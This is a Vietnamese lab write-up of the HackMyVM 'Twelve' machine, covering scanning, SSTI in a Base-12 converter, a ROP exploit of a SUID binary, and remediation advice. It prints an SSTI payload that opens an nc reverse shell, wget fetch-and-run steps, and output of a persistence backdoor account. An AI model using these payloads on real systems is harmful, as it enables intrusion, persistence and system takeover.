# HackMyVM — Twelve

## Thông tin bài lab

| Thành phần | Thông tin |
|---|---|
| Máy Kali | `10.0.2.15` |
| Máy Twelve (Target) | `10.0.2.9` |
| SSH | `22/tcp` — OpenSSH 9.2p1 Debian 2+deb12u7 |
| HTTP | `80/tcp` — Apache httpd 2.4.66 (Debian) |
| Ứng dụng web | `1212/tcp` — Werkzeug 2.2.2 / Python 3.11.2 — Base-12 Converter |
| Reverse shell ban đầu | `443/tcp` |
| Reverse shell sau ROP | `4321/tcp` |
| Thư mục làm việc Kali | `/root/twelve` |
| Tài khoản ban đầu | `www-data` (UID 33) |
| Chương trình SUID | `/usr/local/bin/12` |
| Tài khoản đặc quyền | `root` |

> **Quy ước 2 terminal**
>
> - 🟦 **Terminal 1 (Kali)**: khảo sát mạng, quét cổng, lắng nghe reverse shell, chia sẻ file exploit.
> - 🟥 **Terminal 2 / Shell Twelve**: thao tác trên máy mục tiêu (www-data → root).
>
> Không chạy nhầm lệnh giữa 2 máy.

**Mục lục**

- [1. Câu 1 — Khảo sát hệ thống](#1-câu-1--khảo-sát-hệ-thống)
- [2. Câu 2 — Khai thác và chứng minh quyền truy cập](#2-câu-2--khai-thác-và-chứng-minh-quyền-truy-cập)
- [3. Câu 3 — Đề xuất biện pháp khắc phục](#3-câu-3--đề-xuất-biện-pháp-khắc-phục)

---

# 1. Câu 1 — Khảo sát hệ thống

**Thực hiện quá trình trinh sát và quét máy chủ để xác định các cổng mạng đang mở, dịch vụ đang chạy trên các cổng đó và các thông tin liên quan có thể hỗ trợ quá trình đánh giá bảo mật.**

## 1.1. Mục tiêu

- Xác định kết nối giữa Kali và máy Twelve.
- Xác định địa chỉ IP của hai máy.
- Kiểm tra khả năng kết nối mạng.
- Quét toàn bộ cổng TCP đang mở.
- Nhận diện dịch vụ và công nghệ đang chạy.
- Xác định bề mặt tấn công ban đầu.

## 1.2. Chuẩn bị môi trường

### 🟦 Terminal 1 — Kali

Chuyển sang root và tạo thư mục làm việc:

```bash
sudo su
cd /root
mkdir -p /root/twelve
cd /root/twelve
pwd
```

Kết quả mong đợi:

```text
/root/twelve
```

Giải thích:

- `sudo su`: chuyển sang tài khoản root.
- `mkdir -p /root/twelve`: tạo thư mục làm việc (không báo lỗi nếu đã tồn tại).
- `pwd`: xác nhận vị trí hiện tại.

## 1.3. Xác định địa chỉ IP

### 🟦 Terminal 1 — Kali

```bash
ip -br addr
```

Kết quả thực tế:

```text
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0             UP             10.0.2.15/24 fe80::a775:e66d:427:d2b5/64
```

Đặt biến môi trường cho IP máy mục tiêu:

```bash
export IP=10.0.2.9
echo "$IP"
```

Kết quả:

```text
10.0.2.9
```

Biến `$IP` được dùng trong các lệnh khảo sát tiếp theo để tránh gõ lại địa chỉ.

## 1.4. Kiểm tra kết nối mạng

### 🟦 Terminal 1 — Kali

```bash
ping -c 4 "$IP"
```

Kết quả thực tế:

```text
PING 10.0.2.9 (10.0.2.9) 56(84) bytes of data.
64 bytes from 10.0.2.9: icmp_seq=1 ttl=64 time=1.52 ms
64 bytes from 10.0.2.9: icmp_seq=2 ttl=64 time=0.744 ms
64 bytes from 10.0.2.9: icmp_seq=3 ttl=64 time=0.699 ms
64 bytes from 10.0.2.9: icmp_seq=4 ttl=64 time=0.490 ms

--- 10.0.2.9 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3055ms
rtt min/avg/max/mdev = 0.490/0.862/1.516/0.389 ms
```

Máy Twelve đang hoạt động và có thể kết nối từ Kali (0% packet loss).

## 1.5. Quét cổng và nhận diện dịch vụ

### 🟦 Terminal 1 — Kali

```bash
nmap -Pn -sC -sV -p- "$IP" -oN /root/twelve/nmap-all-ports.txt
```

Giải thích tùy chọn:

| Tùy chọn | Ý nghĩa |
|---|---|
| `-Pn` | Bỏ qua bước dò host bằng ICMP |
| `-sC` | Chạy các NSE script mặc định |
| `-sV` | Nhận diện phiên bản dịch vụ |
| `-p-` | Quét toàn bộ 65.535 cổng TCP |
| `-oN` | Lưu kết quả dạng text thông thường |

Kết quả thực tế (tóm tắt):

| Cổng | Trạng thái | Dịch vụ | Thông tin |
|---|---|---|---|
| 22/tcp | Open | SSH | OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0) |
| 80/tcp | Open | HTTP | Apache httpd 2.4.66 ((Debian)) — tiêu đề: *Apache2 Debian Default Page: It works* |
| 1212/tcp | Open | HTTP | Werkzeug httpd 2.2.2 (Python 3.11.2) — tiêu đề: *Base-12 Converter* |

MAC Address: `08:00:27:E0:B9:4E` (Oracle VirtualBox virtual NIC).

Không kết luận lỗ hổng chỉ dựa trên phiên bản dịch vụ. Cổng 1212 (Base-12 Converter) là đối tượng cần kiểm tra sâu hơn.

## 1.6. Lưu và tổng hợp kết quả khảo sát

### 🟦 Terminal 1 — Kali

Xem lại kết quả Nmap đã lưu:

```bash
cat /root/twelve/nmap-all-ports.txt
```

Các tệp ghi nhận trong quá trình thực hành (đã xác nhận tồn tại):

```text
/root/twelve/
├── nmap-all-ports.txt      # Kết quả quét toàn bộ cổng
├── nmap-initial.txt        # Kết quả quét ban đầu
├── http-response.txt       # Phản hồi HTTP thu thập được
├── scan-summary.txt        # Tóm tắt khảo sát
├── ssti-evidence.txt       # Ghi nhận liên quan SSTI
├── suid-analysis.txt       # Phân tích chương trình SUID
├── findings.txt            # Tổng hợp phát hiện
└── session.log             # Nhật ký phiên làm việc
```

## 1.7. Nhận xét sau khảo sát

- Máy mục tiêu hoạt động và có thể kết nối từ Kali.
- Ba cổng TCP mở: **22** (SSH), **80** (Apache), **1212** (Werkzeug — Base-12 Converter).
- Ứng dụng Base-12 Converter trên cổng 1212 là bề mặt tấn công chính cần kiểm tra tiếp.
- Kết quả khảo sát đã được lưu trong `/root/twelve`.

**Bảng tóm tắt bề mặt tấn công**

| Thành phần | Chi tiết |
|---|---|
| Target IP | 10.0.2.9 |
| Open ports | 22/tcp, 80/tcp, 1212/tcp |
| Ứng dụng quan trọng | Base-12 Converter (Werkzeug 2.2.2 / Python 3.11.2) |
| Hướng khai thác tiếp theo | Kiểm tra ứng dụng web trên cổng 1212 |

---

# 2. Câu 2 — Khai thác và chứng minh quyền truy cập

**Thực hiện khai thác các cấu hình bảo mật yếu trên máy để đạt được quyền truy cập ban đầu, nâng cao đặc quyền và chứng minh mức độ kiểm soát hệ thống bằng cách tìm và thu thập `user.txt` và `root.txt`.**

## 2.1. Khảo sát ứng dụng Base-12 Converter

Truy cập ứng dụng:

```text
http://10.0.2.9:1212
```

Ứng dụng thực hiện chuyển đổi số (Base-12 Converter). Các ví dụ quan sát được khi thử nghiệm:

| Giá trị đầu vào | Kết quả |
|---|---|
| 12 | 10 |
| 13 | 11 |
| 144 | 100 |
| 777777 | 316129 |
|{{ ''.__class__.__mro__[1].__subclasses__() }}| lỗi|
| Biểu thức kiểm thử SSTI | Kết nối đến Kali qua cổng `443` |

> Biểu thức kiểm thử SSTI: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.15 443 >/tmp/f').read() }}

Đây là dữ liệu quan sát trực tiếp khi tương tác với ứng dụng.

## 2.2. Phát hiện và khai thác SSTI

Trong quá trình kiểm thử, ứng dụng được xác định tồn tại lỗ hổng **Server-Side Template Injection (SSTI)**.

Thông tin thực tế đã ghi nhận:

| Mục | Giá trị |
|---|---|
| Tài khoản thực thi | `www-data` |
| UID | 33 |
| Đường dẫn mã nguồn ứng dụng | `/opt/twelve_app/app.py` |

Phân biệt nguồn thông tin:

- **Quan sát trực tiếp**: tài khoản `www-data` (UID 33), shell sau khi kết nối reverse, đường dẫn làm việc `/opt/twelve_app`.
- **Từ quá trình khai thác / write-up**: lỗ hổng SSTI được sử dụng để tạo reverse shell.

> **Lưu ý**: Payload SSTI cụ thể không xuất hiện đầy đủ trong nhật ký terminal đã cung cấp. Phần này đánh dấu là **nội dung cần bổ sung payload chính xác** nếu muốn tái hiện 100% từ đầu; không tự dựng payload rồi khẳng định đã chạy.

## 2.3. Thiết lập reverse shell ban đầu

### 🟦 Terminal 2 — Kali (lắng nghe)

```bash
sudo su
cd /root/twelve
nc -lvp 443
```

Khi kết nối thành công, thông báo thực tế:

```text
listening on [any] 443 ...
10.0.2.9: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.9] 49952
/bin/sh: 0: can't access tty; job control turned off
$
```

Shell ban đầu hoạt động với quyền `www-data`.

## 2.4. Nâng cấp shell

### 🟥 Shell Twelve — quyền www-data

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Giải thích:

- Tạo pseudo-terminal (PTY) để thao tác thuận tiện hơn.
- Không thay đổi quyền người dùng hiện tại.

Xác minh danh tính và thông tin máy:

```bash
whoami
hostname
id
pwd
```

Kết quả thực tế:

```text
www-data
Twelve
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/opt/twelve_app
```

## 2.5. Khảo sát hệ thống sau khi có shell

### 🟥 Shell Twelve — quyền www-data

```bash
ls
ls -ahlR /home
```

Quan sát:

- Thư mục làm việc của ứng dụng chứa `app.py`.
- Trong `/home` có tài khoản `debian`.
- Tồn tại tệp `user.txt` tại `/home/debian/user.txt`.

Đọc user flag:

```bash
cat /home/debian/user.txt
```

Kết quả thực tế:

```text
flag{user-8453eaca1baf2ad1abc7c17615fb8b91}
```

Đây là bằng chứng đã đọc được user flag bằng shell `www-data`.

## 2.6. Tìm kiếm chương trình SUID

### 🟥 Shell Twelve — quyền www-data

```bash
find / -perm -4000 -type f 2>/dev/null
```

Trong kết quả có:

```text
/usr/local/bin/12
```

Kiểm tra quyền:

```bash
ls -la /usr/local/bin/12
```

Kết quả thực tế:

```text
-rwsr-sr-x 1 root root 10240 Jan 30  2026 /usr/local/bin/12
```

Giải thích:

- Chủ sở hữu: `root`.
- SUID và SGID đều được bật (`rwsr-sr-x`).
- Đây là chương trình cần phân tích để tìm khả năng leo thang đặc quyền.

## 2.7. Phân tích chương trình `/usr/local/bin/12`

### 🟥 Shell Twelve — quyền www-data

```bash
file /usr/local/bin/12
```

Kết quả thực tế:

```text
/usr/local/bin/12: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, stripped
```

Thuộc tính quan trọng:

- ELF 64-bit, kiến trúc x86-64.
- Có SUID và SGID.
- Liên kết động, đã bị strip.

Chạy thử chương trình:

```bash
/usr/local/bin/12
```

Menu quan sát được:

```text
Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
:
```

Chức năng theo thông báo của chương trình:

| Lựa chọn | Chức năng |
|---|---|
| 1 | Lấy địa chỉ libc |
| 2 | Lấy địa chỉ của một hàm libc (theo symbol) |
| 3 | Gửi dữ liệu vào bộ đệm (ROP buffer) |
| 4 | Thoát chương trình |

Kiểm tra trực tiếp (ví dụ):

- Lựa chọn 1 trả về địa chỉ libc (thay đổi theo ASLR).
- Lựa chọn 2 cho phép truy vấn địa chỉ hàm.
- Lựa chọn 3 nhận dữ liệu từ người dùng vào bộ đệm.

> **Phân biệt bằng chứng**: Đặc điểm Buffer Overflow / ROP được mô tả trong write-up và trong thông báo của chương trình. Chưa có bằng chứng phân tích mã máy độc lập (checksec chưa chạy thành công vì lệnh không có sẵn trên target). Không khẳng định đã xác minh đầy đủ mọi chi tiết bảo vệ bộ nhớ nếu chưa có dữ liệu trực tiếp.

## 2.8. Chuẩn bị `exploit.py`

Trong quá trình thực hành, Kali chia sẻ file qua HTTP server; máy Twelve tải về bằng `wget`.

Các lần thử và kết quả:

| Lệnh tải | Kết quả |
|---|---|
| `wget http://10.0.2.3/exploit.py` | Thất bại — `No route to host` |
| `wget http://10.0.2.9/exploit.py` (cổng 80) | `404 Not Found` |
| `wget http://10.0.2.15/exploit.py` | Thành công — HTTP 200 OK |

**Phân biệt IP**:

- Kali thực tế: **10.0.2.15**
- Target: **10.0.2.9**
- `10.0.2.3` là địa chỉ sai (không phải IP Kali) → gây lỗi “No route to host”.

Lệnh tải đúng (chạy trong shell www-data của Twelve):

```bash
cd /tmp
wget http://10.0.2.15/exploit.py -O exploit.py
```

Trước đó, trên Kali cần phục vụ file (ví dụ):

```bash
# Trên Kali, trong thư mục chứa exploit.py đã sửa
python3 -m http.server 80
```

> Tải file thành công ≠ exploit đã thành công. Bước tiếp theo mới là chạy exploit.

## 2.9. Phân tích cấu trúc `exploit.py`

Mã nguồn (đã sửa IP reverse shell thành `10.0.2.15`) gồm các thành phần chính:

### a. Khởi tạo tiến trình

Sử dụng `subprocess.Popen` để chạy `/usr/local/bin/12` và giao tiếp qua stdin/stdout.

### b. Hàm hỗ trợ

| Hàm | Vai trò |
|---|---|
| `p64` | Chuyển số nguyên 64-bit thành chuỗi byte Little-Endian |
| `com` | Gửi dữ liệu vào chương trình |
| `recv_to` | Đọc dữ liệu cho đến khi gặp token cần tìm |

### c. Rò rỉ địa chỉ libc (Stage 1)

Script dùng menu option 2 để lấy địa chỉ hàm `system`, sau đó tính:

- `system_leak`
- `libc_base` (= `system_leak - 0x4c330`)
- `pop_rdi`, `bin_sh`, `setuid`, `align_ret` (các offset phụ thuộc libc cụ thể trên máy này)

**Lưu ý**: Offset chỉ đúng với phiên bản libc của máy lab; không áp dụng mù quáng cho mọi hệ thống.

### d. Xây dựng ROP chain (Stage 2)

Chuỗi ROP trong script:

1. `align_ret` — căn chỉnh stack 16 byte.
2. `pop_rdi` + `0` → `setuid(0)`.
3. `pop_rdi` + địa chỉ `"/bin/sh"` → `system("/bin/sh")`.

Payload được báo cáo có kích thước **56 byte**.

### e. Gửi dữ liệu và kích hoạt (Stage 3)

- Menu 3: gửi payload.
- Menu 4: thoát chương trình → kích hoạt ROP.

Phần post-exploitation trong script còn tạo user `emvee` và gọi reverse shell đến cổng 4321. Đây là **hành động duy trì quyền truy cập**, không phải bằng chứng bắt buộc để xác nhận root.

## 2.10. Thực thi exploit và xác nhận quyền root

### 🟥 Shell Twelve — quyền www-data

```bash
python3 exploit.py
```

Kết quả thực tế (một lần chạy điển hình):

```text
[+] Starting exploit for target: Twelve
[*] Stage 1: Leaking Libc Address via function 'system'
    [>] Libc Address (system): 0x7f5e4d8a2330
    [>] Calculated Libc Base : 0x7f5e4d856000
[*] Stage 2: Nom nom ROP buffer to stack
    [>] Payload injected (56 bytes)
[*] Stage 3: Triggering exploit via Menu 4 (Exit)
[!] Exploit successful! Executing post-exploitation tasks...
uid=0(root) gid=33(www-data) groups=33(www-data)
root
[+] PERSISTENCE SUCCESS: User emvee created with pass H4ck3d
[+] REVERSE SHELL TRIGGERED: Check your listener on port 4321!
```

Giải thích:

- Địa chỉ libc thay đổi giữa các lần chạy do ASLR.
- Script tính `libc_base` từ địa chỉ bị rò rỉ.
- Payload 56 byte.
- `uid=0(root)` là bằng chứng UID hiệu lực đã là 0.
- `gid=33(www-data)` vẫn giữ nguyên — UID và GID là hai khái niệm khác nhau; UID 0 đủ để có quyền root.

Không chỉ dựa vào dòng thông báo `[!] Exploit successful!`; dùng kết quả `id` / `whoami` làm bằng chứng.

## 2.11. Kết nối reverse shell cổng 4321

### 🟦 Terminal 2 — Kali

```bash
cd /root/twelve
nc -lvp 4321
```

Trong nhật ký có lần script cố kết nối đến **10.0.2.3:4321** và thất bại:

```text
(UNKNOWN) [10.0.2.3] 4321 (?) : No route to host
```

Nguyên nhân: script cũ dùng IP sai (`10.0.2.3`). IP Kali đúng là **10.0.2.15**. Phiên bản `exploit.py` đã sửa dùng `10.0.2.15`.

Sau đó, nhật ký ghi nhận phiên reverse shell thành công trên cổng 4321 với prompt root:

```text
root@Twelve:/tmp# whoami
root

root@Twelve:/tmp# hostname
Twelve

root@Twelve:/tmp# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

Phân biệt rõ:

- Lần script báo “REVERSE SHELL TRIGGERED” nhưng đích 10.0.2.3 → thất bại.
- Phiên shell root thực tế được tiếp nhận trên Terminal 2 sau đó.

## 2.12. Thu thập root flag

### 🟥 Shell root trên Twelve

```bash
cd /root
cat root.txt
```

Kết quả thực tế:

```text
flag{root-a6127743d7835b6b4dd8debe12e9879a}
[rootpass: smokeylo]
```

Bằng chứng hoàn tất:

- `whoami` → `root`
- `id` → `uid=0(root)`
- `cat /root/root.txt` đọc được root flag

## 2.13. Tổng kết quá trình khai thác

| Giai đoạn | Kết quả | Trạng thái |
|---|---|---|
| Khảo sát mạng | Xác định được máy Twelve | Thành công |
| Quét cổng | Phát hiện 22, 80, 1212 | Thành công |
| Khai thác ứng dụng web | Có shell www-data | Thành công |
| Khảo sát nội bộ | Tìm thấy user.txt và chương trình SUID | Thành công |
| Phân tích chương trình | Quan sát menu và thuộc tính SUID/SGID | Thành công |
| Khai thác ROP | Script báo cáo payload 56 byte và UID 0 | Thành công (theo nhật ký) |
| Reverse shell cổng 4321 | Có phiên root được ghi nhận; có lần kết nối lỗi do IP sai | Cần mô tả theo từng lần thử |
| Thu thập user flag | Đọc được `/home/debian/user.txt` | Thành công |
| Thu thập root flag | Đọc được `/root/root.txt` | Thành công |

**Chuỗi khai thác tóm tắt**

```text
┌────────────────────────┐
│ 🟦 KALI                │
│ 10.0.2.15              │
└───────────┬────────────┘
            │ nmap + web
            ▼
┌────────────────────────┐
│ 1212/tcp Base-12       │
│ SSTI → reverse shell   │
│ cổng 443               │
└───────────┬────────────┘
            │
            ▼
┌────────────────────────┐
│ 🟥 Twelve              │
│ www-data (UID 33)      │
│ Đọc user.txt           │
│ Tìm /usr/local/bin/12  │
└───────────┬────────────┘
            │ ROP exploit
            ▼
┌────────────────────────┐
│ uid=0(root)            │
│ Reverse shell 4321     │
│ Đọc /root/root.txt     │
└────────────────────────┘
```

---

# 3. Câu 3 — Đề xuất biện pháp khắc phục

**Phân tích nguyên nhân dẫn đến khả năng khai thác hệ thống và đề xuất các biện pháp khắc phục nhằm ngăn chặn việc truy cập trái phép, leo thang đặc quyền và bảo vệ các tài nguyên quan trọng của hệ thống.**

## 3.1. Tổng hợp các vấn đề bảo mật

| STT | Vấn đề | Tác động |
|---|---|---|
| 1 | SSTI trong ứng dụng web Base-12 Converter | Có thể dẫn đến thực thi lệnh / reverse shell (đã chứng minh trong lab) |
| 2 | Chương trình SUID/SGID (`/usr/local/bin/12`) nhận dữ liệu từ người dùng | Nguy cơ bị khai thác để thay đổi đặc quyền (đã chứng minh) |
| 3 | Rò rỉ địa chỉ libc qua menu chương trình | Hỗ trợ xây dựng chuỗi ROP (đã quan sát) |
| 4 | Khả năng tràn bộ đệm / ROP | Thay đổi luồng thực thi, đạt UID 0 (đã chứng minh) |
| 5 | Ứng dụng chạy dưới tài khoản dịch vụ `www-data` | Nếu bị khai thác, kẻ tấn công có quyền tương ứng với tài khoản đó |

Chỉ trình bày tác động phù hợp với bằng chứng thực tế. Phân biệt nguy cơ lý thuyết với tác động đã được chứng minh.

## 3.2. Biện pháp khắc phục SSTI

- Không đưa dữ liệu đầu vào của người dùng trực tiếp vào template theo cách không an toàn.
- Sử dụng cơ chế truyền tham số an toàn của framework (ví dụ context/parameterized rendering).
- Kiểm tra và giới hạn dữ liệu đầu vào (whitelist, độ dài, kiểu dữ liệu).
- Hạn chế quyền của tiến trình web (chạy với user/group tối thiểu cần thiết).
- Không để ứng dụng web có quyền truy cập không cần thiết vào các tệp hệ thống.
- Thực hiện kiểm thử bảo mật ứng dụng định kỳ (SAST/DAST, review code).

## 3.3. Biện pháp khắc phục chương trình SUID/SGID

- Rà soát toàn bộ chương trình có bit SUID/SGID (`find / -perm -4000 -type f`).
- Gỡ bỏ SUID/SGID nếu không thực sự cần thiết.
- Hạn chế quyền thực thi đối với người dùng không cần thiết.
- Kiểm tra dữ liệu đầu vào và giới hạn kích thước bộ đệm.
- Sử dụng các hàm xử lý chuỗi an toàn.
- Bật các cơ chế bảo vệ biên dịch phù hợp (canary, NX, PIE, RELRO).
- Kiểm tra quyền UID/GID trong chương trình trước khi thực hiện thao tác nhạy cảm.
- Thực hiện kiểm thử bảo mật (fuzzing, binary analysis) trước khi triển khai.

## 3.4. Biện pháp giảm thiểu nguy cơ khai thác ROP

- Bật ASLR.
- Sử dụng NX/DEP để ngăn thực thi dữ liệu trên vùng nhớ không được phép.
- Bật Stack Canary.
- Sử dụng PIE khi phù hợp.
- Bật RELRO (Full RELRO nếu có thể).
- Biên dịch chương trình với các tùy chọn bảo mật thích hợp.
- Xử lý lỗi bộ đệm ngay từ thiết kế chương trình (không phụ thuộc hoàn toàn vào mitigation).

Các cơ chế trên làm tăng độ khó khai thác nhưng **không thay thế** việc sửa lỗi gốc trong mã nguồn.

## 3.5. Biện pháp bảo vệ hệ thống và giám sát

- Phân quyền theo nguyên tắc đặc quyền tối thiểu (Least Privilege).
- Giám sát các tiến trình chạy với SUID/SGID.
- Theo dõi các kết nối mạng bất thường (reverse shell, cổng không chuẩn).
- Ghi log các sự kiện quan trọng (đăng nhập, thực thi binary nhạy cảm, thay đổi file system).
- Rà soát tài khoản và quyền truy cập định kỳ.
- Không để lại tài khoản hoặc cơ chế truy cập không cần thiết sau kiểm thử (ví dụ user `emvee` nếu được tạo).
- Thực hiện kiểm tra cấu hình bảo mật định kỳ (capabilities, SUID, sudoers, firewall).

## 3.6. Kết luận

Quá trình thực hành trên máy **HackMyVM — Twelve** gồm ba giai đoạn chính:

1. **Khảo sát**: xác định kết nối, quét cổng, nhận diện dịch vụ SSH / Apache / Base-12 Converter (cổng 1212).
2. **Khai thác**: từ SSTI trên ứng dụng web → shell `www-data` → đọc user flag → phát hiện và khai thác chương trình SUID `/usr/local/bin/12` bằng ROP → đạt UID 0 và đọc root flag.
3. **Khắc phục**: tập trung vào sửa SSTI, rà soát/gỡ SUID không cần thiết, bật mitigation biên dịch, áp dụng Least Privilege và giám sát liên tục.

Kết luận dựa trên bằng chứng thực hành trong lab; không phóng đại mức độ ảnh hưởng ngoài phạm vi máy ảo.

---

## Phụ lục — Lệnh tái hiện nhanh (copy-paste)

### 🟦 Terminal 1 — Kali (khảo sát + listener)

```bash
sudo su
mkdir -p /root/twelve && cd /root/twelve
export IP=10.0.2.9
ping -c 4 "$IP"
nmap -Pn -sC -sV -p- "$IP" -oN /root/twelve/nmap-all-ports.txt

# Lắng nghe reverse shell ban đầu
nc -lvp 443

# (Sau khi có shell www-data) Lắng nghe reverse shell sau ROP
nc -lvp 4321

# Phục vụ exploit.py (trong thư mục chứa file đã sửa IP)
python3 -m http.server 80
```

### 🟥 Shell Twelve — www-data → root

```bash
# Sau khi nhận reverse shell cổng 443
python3 -c 'import pty; pty.spawn("/bin/bash")'
whoami; hostname; id; pwd
cat /home/debian/user.txt
find / -perm -4000 -type f 2>/dev/null
ls -la /usr/local/bin/12
file /usr/local/bin/12

# Tải và chạy exploit (IP Kali = 10.0.2.15)
cd /tmp
wget http://10.0.2.15/exploit.py -O exploit.py
python3 exploit.py
```

### 🟥 Shell root (sau khi reverse shell 4321 thành công)

```bash
whoami; hostname; id
cd /root
cat root.txt
```

**Flag thu được**

| Flag | Giá trị |
|---|---|
| User | `flag{user-8453eaca1baf2ad1abc7c17615fb8b91}` |
| Root | `flag{root-a6127743d7835b6b4dd8debe12e9879a}` |
